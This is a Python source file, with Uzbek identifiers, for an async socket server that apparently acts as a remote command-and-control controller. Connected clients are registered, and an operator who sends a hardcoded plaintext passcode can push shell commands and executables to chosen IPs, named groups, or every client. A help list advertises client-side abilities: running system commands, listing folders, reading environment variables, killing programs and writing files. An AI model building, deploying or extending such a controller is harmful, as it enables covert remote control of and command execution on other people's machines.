import AS
from os import system
from os.path import getsize
from json import dumps,loads
import socket

sleep=AS.asyncio.sleep

serv=AS.AS('0.0.0.0',7592)
commondor={'comnata1':''}
users={}
adminret=None
admin=None

def adminpanel(c:str):
    global commondor,adminret
    adminret=None
    try:
        with open('guruhlar.json','r') as f:
            teams = loads(f.read())
    except:teams={}
    if c=='ulanishlar':adminret = users
    elif c=='':commondor['comnata1']=''
    elif c=='pyC':adminret = ['tizim(cmdkodi)','papkafayllari(path=None)','sysenv','dasturyopish(nomi)','ishgaT(startfile parametrlari)','joriyjarayonpapkasi','papkanipolniKorish(joylashuv)','habar(matn,sarlavha,turi[axborot,ogohlantirish,xato,savol])','yuklashjoyi',"jarayonpapkasinibelgilash(joylashuv)","faylyozish(nom+format,matn,joylashuv='')"]
    elif c=='cls':system('cls')
    # elif c=='IPsave':
    #     with open('guruhlar.json','w') as f:
    #         f.write(dumps(teams))
    # elif c=='IPtartiblash':teams[input('Guruh nomi >> ')]=input('IP lar (;)\n>>').split(';')
    # elif c=='IPbekor':del teams[input('Guruh nomi >> ')]
    else:
        nip=''
        for i in c.split('#')[0].split(';'):
            if i[0].isalpha():#team!(ip,ip)
                nott=i.find('!(')
                nott=(nott if nott!=-1 else None)
                if nott:dell=i[i.find('!(')+2:i.find(')')].split(',')
                ips=teams.get(i[:nott],False)#Guruh nomi topilmasa False
                if ips!=False:
                    if nott:
                        for ip in ips:
                            if ip not in dell:
                                nip+=';'+ip
                    else:
                        for ip in ips:nip+=';'+ip
            else:nip+=';'+i
        commondor['comnata1']=[nip[1:]]+c.split('#')[1:]
        

async def body(cli):
    global commondor,users
    command=commondor.get('comnata1','')
    cl=True
    while (not command) or (commondor.get(cli,'')==command):
        if not users[cli]:return 0
        if command=='' and cl:commondor[cli]='';cl=False
        command=commondor.get('comnata1','')
        await sleep(0.5)
    commondor[cli]=command
    command=list(command)
    if (str(command[0]).split(';')==['*']) or (cli in str(command[0]).split(';')):#Validation (men haqimda gap ketyaptimi ?)
        try:
            # print('command',command[1])
            if command[1]=='run':await serv.sMessage(cli,b'com'+command[2].encode())
            elif command[1]=='exe':await serv.sMessage(cli,b'exe'+command[2].encode())
            # elif command[1]=='file':
            #     # print(len(b'fil'+command[3].rjust(249,' ').encode()))
            #     await serv.sMessage(cli,b'fil'+command[3].rjust(249).encode())
            #     with open(command[2],'rb') as f:
            #         await serv.sFile(cli,f,getsize(command[2]))
            else:print("!Xato Buyruq (run yoki file bo'lishi kerak)");await body(cli)
        except:del users[cli]
    else:await body(cli)

@serv.message_reception
async def mr(data,addr,co):#identifiying with addr[1](PORT)
    global admin
    # print('(',addr,')->',data,flush=True)
    if data[:6]==b'PaCode':
        data = data[6:]
        if data==b'Rbehruzz7592':
            admin=addr[1]
        elif data==b'behruzz7592':
            await serv.sMessage(addr[1],b'OK!.')
        elif data[:11]==b'behruzz7592':#Pass Code
            global adminret
            adminpanel(data[11:].decode())
            await serv.sMessage(addr[1],b'1')
        else:await serv.sMessage(addr[1],'Nope.')
        if admin:await serv.sMessage(admin,str(adminret).encode())
        return 0
    elif co==0:
        global users
        users[addr[1]]=data
        await serv.sMessage(addr[1],b'1',1)
        return 0
    else:
        if admin:await serv.sMessage(admin,f"[{addr[1]}] -> ".encode()+data)
        # print(addr[1],'to jail for',data)
        await body(addr[1])

@serv.client_exited
def ex(addr):
    try:
        global users
        del users[addr[1]]
    except:
        print("Noto'g'ri CLICON",users[addr[1]])

@serv.start
async def stt(w):
    loop = AS.asyncio.get_running_loop()
    print(await loop.run_in_executor(None, lambda: socket.gethostbyname(socket.gethostname())))

serv.run()